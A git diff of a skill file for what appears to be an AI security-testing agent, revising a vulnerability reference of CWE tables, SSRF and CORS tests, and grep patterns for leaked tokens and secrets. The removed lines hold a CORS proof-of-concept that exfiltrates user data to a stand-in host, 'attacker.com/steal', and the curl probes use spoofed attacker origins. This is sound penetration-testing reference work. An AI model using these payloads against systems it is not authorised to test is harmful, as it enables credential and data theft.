@@ -1,186 +1,94 @@
 ---
 name: vuln-kb
-description: Local vulnerability knowledge base with CWE references, attack playbooks by tech stack, and detection signatures. Use when you need vulnerability context, CWE details, attack strategies for a specific technology, or detection signatures. Triggers on "vuln-kb", "vulnerability knowledge", "CWE", "attack playbook", "detection signature", "vulnerability reference", "what is CWE", "how to test for".
+description: Local vulnerability knowledge base with CWE references, attack playbooks by tech stack, and detection signatures. Use when you need vulnerability context for a specific CWE, attack strategies for a technology stack, detection signatures for static analysis, or mapping between static analysis signals and vulnerability classes.
 ---
 
 # Vulnerability Knowledge Base
 
-Local reference for vulnerability classes, CWE mappings, attack playbooks, and detection signatures.
+Quick-reference for vulnerability classes, CWE mappings, and detection patterns. For full checklists and analysis strategies, see reference files in this directory.
 
-## CWE Quick Reference
+## Lookup Workflow
 
-### Injection Flaws (OWASP A03:2021)
+1. **Identify signal** -- what did you find? (static analysis match, HTTP traffic pattern, error message)
+2. **Map to vuln class** -- use the Signal -> Vulnerability table below
+3. **Get CWE details** -- find the matching CWE section for test strategy and detection signals
+4. **Verify** -- use the test commands and grep patterns to confirm
 
-| CWE | Name | Source | Sink | Key Signal |
-|-----|------|--------|------|------------|
-| CWE-89 | SQL Injection | User input (params, forms, headers) | Database query (execute, query, prepare without params) | Error messages containing SQL syntax, boolean response differences |
-| CWE-78 | OS Command Injection | User input | System calls (exec, system, popen, subprocess) | Command output in response, time delays |
-| CWE-79 | Cross-Site Scripting | User input | HTML output (innerHTML, document.write, server-side template) | Unencoded reflection in HTML context |
-| CWE-94 | Code Injection | User input | eval(), Function(), setTimeout(string) | Dynamic code execution |
-| CWE-917 | Expression Language Injection | User input | Template engine (Jinja2, Freemarker, Twig, Thymeleaf) | Template syntax in output (e.g., `49` from `{{7*7}}`) |
-| CWE-74 | Improper Neutralization | User input | Any interpreter | Base class for all injection flaws |
+**Checkpoint:** Before reporting, confirm you have: CWE ID, working PoC, and impact statement.
 
-**Detection signals**: `path`, `api_path`, `query_param` matches near sink patterns; error responses containing SQL/template syntax after injection attempts.
-
-### Broken Access Control (OWASP A01:2021)
-
-| CWE | Name | Pattern | Test Strategy |
-|-----|------|---------|---------------|
-| CWE-639 | IDOR | Sequential/predictable resource IDs | Two accounts, cross-access resources |
-| CWE-862 | Missing Authorization | Endpoints without auth check | Access without token/session |
-| CWE-863 | Incorrect Authorization | Auth present but wrong check | Vertical/horizontal privilege escalation |
-| CWE-22 | Path Traversal | File path in parameter | `../` sequences to escape directory |
-| CWE-284 | Improper Access Control | General access control failure | Map all auth boundaries, test each |
-| CWE-276 | Incorrect Default Permissions | Overly permissive defaults | Check new resource permissions |
-
-**Detection signals**: API paths with ID-like segments (`/api/.*/[0-9]+`), endpoints returning different data per user context.
-
-### Cross-Site Scripting Detail (CWE-79)
-
-| Subtype | Source | Sink | Detection |
-|---------|--------|------|-----------|
-| Reflected | URL params, form input | Server-side template output | Input reflected in response without encoding |
-| Stored | Database/persistent input | Any output rendering stored data | Payload persists across requests |
-| DOM-based | URL fragment, document.referrer | innerHTML, document.write, eval | Client-side JS processes URL data |
-
-**Static analysis signals**: `dangerouslySetInnerHTML`, `innerHTML` assignments, `document.write`, `url_search_params` flowing to `window.location` assignment.
-
-### Cross-Origin Resource Sharing (CWE-942 / CWE-184)
-
-| Misconfiguration | Test | Exploitation Requirements |
-|------------------|------|--------------------------|
-| `Access-Control-Allow-Origin: *` with credentials | Send `Origin: attacker.com`, check if reflected with `Access-Control-Allow-Credentials: true` | Must demonstrate credential theft or state-changing action |
-| Dynamic origin reflection | Send `Origin: attacker.com`, check if echoed in response header | Must bypass mitigating factors; must show actual data exfiltration |
-| Null origin allowed | Send `Origin: null`, check for `Access-Control-Allow-Origin: null` | Common with local file:// attacks; needs PoC with credential theft |
-| Weak regex matching | Test `Origin: target.com.attacker.com` or `Origin: attacker-target.com` | Must prove regex bypass and data access |
-
-**Reporting Standard:**
-- Just reflecting the Origin header is **NOT sufficient** for a valid report
-- Must provide **working JavaScript PoC** that extracts session cookies, tokens, or performs authenticated actions
-- Must demonstrate **account takeover** or **state-changing actions** via CORS abuse
-- Theoretical CORS issues without exploitation = **Informational/Rejected**
-
-**Test Commands:**
-```bash
-# Test basic reflection
-curl -s -H "Origin: https://attacker.com" \
-  "https://target.com/api/user" | grep -i "access-control"
-
-# Test with credentials
-curl -s -H "Origin: https://attacker.com" \
-  -H "Cookie: session=xyz" \
-  "https://target.com/api/user" -v 2>&1 | grep -i "access-control"
-```
-
-**Working PoC Template:**
-```html
-<script>
-// Must actually extract sensitive data or perform actions
-fetch('https://target.com/api/user', {
-  credentials: 'include',
-  headers: {'Accept': 'application/json'}
-})
-.then(r => r.json())
-.then(data => {
-  // Exfiltrate to attacker server
-  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
-});
-</script>
-```
-
-### Server-Side Request Forgery (CWE-918)
-
-| Pattern | Test | Impact |
-|---------|------|--------|
-| URL parameter | `url=http://127.0.0.1` | Internal network access |
-| Webhook URL | Register callback to internal IP | Internal service interaction |
-| File import | Import from `file:///etc/passwd` | Local file read |
-| PDF/Image generation | Embed internal URL in content | Blind SSRF via render |
-
-**Detection signals**: Parameters named `url`, `fetch`, `proxy`, `callback`, `webhook`, `redirect`, `href`, `src` in query strings or request bodies.
-
-### Authentication/Session (OWASP A07:2021)
-
-| CWE | Name | Test |
-|-----|------|------|
-| CWE-287 | Improper Authentication | Bypass login without valid credentials |
-| CWE-384 | Session Fixation | Force known session ID on victim |
-| CWE-613 | Insufficient Session Expiration | Check token lifetime, no logout invalidation |
-| CWE-798 | Hardcoded Credentials | Scan source for API keys, passwords |
-| CWE-307 | Brute Force | Unlimited login attempts without lockout |
-
-**Detection signals**: Leaked secrets (JWT, API keys, tokens) in JS source or responses; auth-related endpoints (`/login`, `/auth`, `/token`, `/session`).
-
-### Cryptographic Failures (OWASP A02:2021)
-
-| CWE | Name | Signal |
-|-----|------|--------|
-| CWE-327 | Broken Crypto Algorithm | MD5, SHA1 for passwords, DES encryption |
-| CWE-328 | Reversible One-Way Hash | Weak hash without salt |
-| CWE-330 | Insufficient Randomness | Math.random() for tokens, sequential IDs |
-| CWE-311 | Missing Encryption | Sensitive data over HTTP, plaintext storage |
-
-### Business Logic
-
-| Category | Pattern | Test |
-|----------|---------|------|
-| Race Condition | Concurrent state changes | Parallel requests to same endpoint |
-| Price Manipulation | Client-side price calculation | Modify price in request body |
-| Workflow Bypass | Multi-step process | Skip steps, replay earlier step |
-| Privilege Escalation | Role-based features | Access admin features as regular user |
-
-### AI/LLM Specific (OWASP LLM Top 10)
-
-| Category | CWE Analog | Pattern |
-|----------|-----------|---------|
-| Prompt Injection | CWE-74 (injection) | User input reaches model context without sanitization |
-| Insecure Output | CWE-79 (XSS) | Model output rendered as HTML/code without sanitization |
-| Training Data Poisoning | CWE-502 (deserialization) | Malicious data in training/fine-tuning pipeline |
-| Excessive Agency | CWE-269 (privilege) | Model has unrestricted tool access |
-| System Prompt Leak | CWE-200 (info disclosure) | System instructions extractable via prompt manipulation |
-
-## Static Analysis Signal -> Vulnerability Mapping
+## Signal -> Vulnerability Mapping
 
 | Signal Pattern | Potential Vulnerability | Priority |
 |---|---|---|
 | `dangerouslySetInnerHTML` | DOM XSS (React) | High |
 | `innerHTML` assignment | DOM XSS (vanilla JS) | High |
-| `window.onmessage` / `addEventListener('message')` | postMessage XSS / cross-origin abuse | High |
+| `addEventListener('message')` | postMessage XSS / cross-origin abuse | High |
 | `location.href` / `window.location` assignment | Open redirect / javascript: XSS | Medium |
-| `URLSearchParams` | Client-side parameter injection | Medium |
-| Hardcoded JWT | Token reuse (test if valid) | High |
-| Leaked API keys / tokens | Credential exposure | Critical |
-| `__schema` / `__type` in requests | GraphQL introspection surface | Medium |
+| Hardcoded JWT / API keys in JS | Credential exposure | Critical |
 | API paths with numeric IDs | IDOR candidates | Medium |
+| `__schema` / `__type` in requests | GraphQL introspection | Medium |
 
-## Useful Grep Patterns for HTTP Traffic
+## CWE Quick Reference
 
+### Injection (OWASP A03)
+
+| CWE | Name | Key Signal |
+|-----|------|------------|
+| CWE-89 | SQL Injection | Error messages with SQL syntax, boolean response differences |
+| CWE-78 | OS Command Injection | Command output in response, time delays |
+| CWE-79 | XSS | Unencoded reflection in HTML context |
+| CWE-94 | Code Injection | Dynamic code execution via eval/Function |
+| CWE-917 | Expression Language Injection | Template syntax in output (`49` from `{{7*7}}`) |
+
+### Broken Access Control (OWASP A01)
+
+| CWE | Name | Test Strategy |
+|-----|------|---------------|
+| CWE-639 | IDOR | Two accounts, cross-access resources |
+| CWE-862 | Missing Authorization | Access without token/session |
+| CWE-863 | Incorrect Authorization | Vertical/horizontal privilege escalation |
+| CWE-22 | Path Traversal | `../` sequences to escape directory |
+
+### SSRF (CWE-918)
+
+| Pattern | Test | Impact |
+|---------|------|--------|
+| URL parameter | `url=http://127.0.0.1` | Internal network access |
+| Webhook URL | Callback to internal IP | Internal service interaction |
+| PDF/Image generation | Embed internal URL | Blind SSRF via render |
+
+Detection: parameters named `url`, `fetch`, `proxy`, `callback`, `webhook`, `redirect`, `href`, `src`.
+
+### CORS Misconfiguration (CWE-942)
+
+```bash
+# Test origin reflection
+curl -s -H "Origin: https://attacker.com" "https://target.com/api/user" | grep -i "access-control"
+
+# Test with credentials
+curl -s -H "Origin: https://attacker.com" -H "Cookie: session=xyz" \
+  "https://target.com/api/user" -v 2>&1 | grep -i "access-control"
 ```
-# IDOR candidates - endpoints with numeric IDs
-/[a-z]+/[0-9]+(/|$)
 
-# Potential file inclusion
-(file|path|dir|folder|template|page|include)=
+**Reporting standard:** Origin reflection alone is NOT sufficient. Must provide working JS PoC demonstrating credential theft or state-changing action.
 
-# Potential SSRF
-(url|uri|href|src|redirect|callback|proxy|fetch)=
+## Grep Patterns for HTTP Traffic
+
+```bash
+# IDOR candidates
+rg '/[a-z]+/[0-9]+(/|$)' http_requests/
+
+# Potential SSRF parameters
+rg '(url|uri|href|src|redirect|callback|proxy|fetch)=' http_requests/
 
 # Auth tokens in URLs (should be in headers)
-(token|key|api_key|apikey|secret|auth|session)=
+rg '(token|key|api_key|secret|auth|session)=' http_requests/
 
-# Sensitive data in responses
-(password|secret|private_key|api_key|token)
-
-# Error messages
-(exception|traceback|stack trace|syntax error|SQLSTATE)
-
-# Mass assignment candidates
-PATCH or PUT requests with extra fields
+# Error messages leaking info
+rg '(exception|traceback|stack.trace|syntax.error|SQLSTATE)' http_requests/
 ```
 
-## Usage
+## Reference Files
 
-This knowledge base is consulted during:
-1. **vuln-critic** - To validate finding plausibility and map to CWE
-2. **exploit-verifier** - To select appropriate verification procedures
-3. Testing strategy guidance based on tech stack
+- [testing-checklist.md](testing-checklist.md) -- Full testing checklist by category
+- [analysis-strategies.md](analysis-strategies.md) -- Six analysis lenses (taint, trust boundary, business logic, config audit, race conditions, cross-context)
